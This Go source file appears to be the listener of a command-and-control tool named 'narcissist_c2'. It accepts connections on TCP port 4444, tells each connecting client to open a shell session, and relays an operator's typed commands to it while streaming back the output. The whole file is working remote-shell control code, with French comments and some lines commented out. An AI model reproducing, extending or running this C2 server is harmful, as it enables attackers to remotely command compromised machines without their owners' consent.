package main

import (
	"bufio"
	"fmt"
	"io"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"net"
	"os"
)

func main() {
	server, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer server.Close()
	fmt.Println(utils.GetEmoji("listenning") + "Listening on :4444")

	for {

		conn, err := server.Accept()
		if err != nil {
			fmt.Println(utils.GetEmoji("error")+"Error accepting connection:", err)
			panic(err)

		}

		client := structs.Client{ID: 1, Address: conn.RemoteAddr().String(), Conn: conn}
		go ShellSession(client)
	}
}

func ShellSession(client structs.Client) {

	_, err := client.Conn.Write([]byte("{\"type\":\"shell_session\",\"args\":[\"true\"]}\n"))
	if err != nil {
		fmt.Printf(utils.GetEmoji("error")+"Error while starting shell session: %v\n", err)
		return // Sortir immédiatement si une erreur survient
	}

	// Lancer une goroutine pour lire la sortie du client
	go func() {
		_, err := io.Copy(os.Stdout, client.Conn)
		if err != nil {
			fmt.Printf(utils.GetEmoji("error")+"Error copying output from client: %v\n", err)
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)

	for {
		// Lire l'état d'IOState depuis le canal
		//state := <-IOStateCh.ClientIptCh

		// Si IOState est `false`, désactiver la session (quitter la fonction)
		//if !state {
		//	fmt.Println("Shell session deactivated")
		//	return
		//}

		// Lire les commandes tant que la session est active
		//fmt.Print("Enter command: ")
		if scanner.Scan() {
			command := scanner.Text()

			// Si la commande est "defocus", on quitte la session
			if command == "defocus" {
				fmt.Println("Shell session terminated by defocus command")
				//		IOStateCh.ClientIptCh <- false
				return
			}

			// Envoyer la commande au client
			command += "\n"
			_, err := client.Conn.Write([]byte(command))
			if err != nil {
				fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
				break // Sortir de la boucle si une erreur survient
			}
		} else {
			// Si la lecture échoue, on quitte la session
			fmt.Println("Scanner error or input closed, exiting shell session")
			return
		}
	}
}
